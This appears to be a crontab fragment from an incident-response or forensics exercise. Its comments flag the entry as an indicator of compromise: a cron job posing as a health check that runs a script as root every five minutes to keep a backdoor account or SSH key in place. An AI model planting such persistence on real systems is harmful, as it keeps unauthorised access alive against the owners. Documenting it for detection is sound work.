# IOC:PERSISTENCE-CRON -- disguised as a routine health check; actually
# re-runs /usr/local/bin/sysmon-check (IOC:PERSISTENCE-SCRIPT) every 5
# minutes as root, which is what makes the backdoor account/SSH key
# self-healing rather than a one-time plant.
*/5 * * * * root /usr/local/bin/sysmon-check >> /var/log/sysmon-check.log 2>&1
